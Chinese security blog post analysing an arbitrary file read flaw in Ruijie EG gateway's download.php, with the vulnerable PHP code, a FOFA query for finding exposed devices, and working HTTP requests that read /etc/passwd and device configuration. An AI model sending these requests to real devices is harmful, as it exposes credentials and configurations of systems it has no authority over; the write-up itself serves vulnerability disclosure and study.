---
title: "锐捷-EWEB download.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-download-fileread.html
asset_dir: assets/锐捷-eweb-download.php-文件读取漏洞
---

# 锐捷-EWEB download.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/7 10:22
* 904浏览
* [0评论](#comment)
* 18分钟阅读

深入探索

VPN服务

授权

安全研究报告


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `download.php` 的 `readFileAction` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞预警服务

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `read_txtAction` 的实现逻辑

```
public function read_txtAction()
    {
        $filename = v("file");
        if (!file_exists($filename)) {
            $data["status"] = 2;
            $data["msg"] = $filename . "不存在";
            json_echo($data);
            exit();
        } else {
            $fileContent = file_get_contents($filename);
            $data = array("status" => true, "data" => $fileContent);
            json_echo($data);
        }
    }
```

深入探索

网页浏览器

技术文章订阅

物流软件安全

直接将 `file` 带入 `file_get_contents` 函数进行文件操作，造成任意文件读取漏洞。

再看 `download.php` 中的 `readFileAction` 方法实现

```
public function readFileAction() {
        $filename = '/data/' . p("name");
        if (!file_exists($filename)) {
            $data = $filename . "不存在";
            echo($data);
            exit();
        } else {
            $data = file_get_contents($filename);
            echo($data);
        }
    }
```

直接将无任何过滤和校验 post 获取的 `name` 拼接在 `/data/` 后直接带入 `file_get_contents` 函数中进行文件操作，导致任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
GET /download.php?a=read_txt&file=/etc/passwd HTTP/1.1
Host: ruijieweb.mrxn.net
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
```

[![锐捷-EWEB download.php 文件读取漏洞](images/img-001-7a65879d8370.webp)](https://image.mrxn.net/efc01a77d4994853a7fec296ab72691c.webp)

```
POST /download.php?a=readFile HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

name=config.text
```

成功读取到 `config.text` 文件内容

漏洞预警服务

[![锐捷-EWEB download.php 文件读取漏洞](images/img-002-9e3501c3731b.webp)](https://image.mrxn.net/b17fa8d2966e485dbcc08d19a0e06980.webp)

同样的，通过 sysConfig.php 的 showRunAction 也可以获取系统完整配置

```
GET /pub/sysConfig.php?a=showRun HTTP/1.1
Host: ruijieweb.mrxn.net
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[锐捷-EWEB download.php 文件读取漏洞](https://mrxn.net/jswz/ruijieweb-download-fileread.html)  
文章链接：<https://mrxn.net/jswz/ruijieweb-download-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全研究工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-download-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-download-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 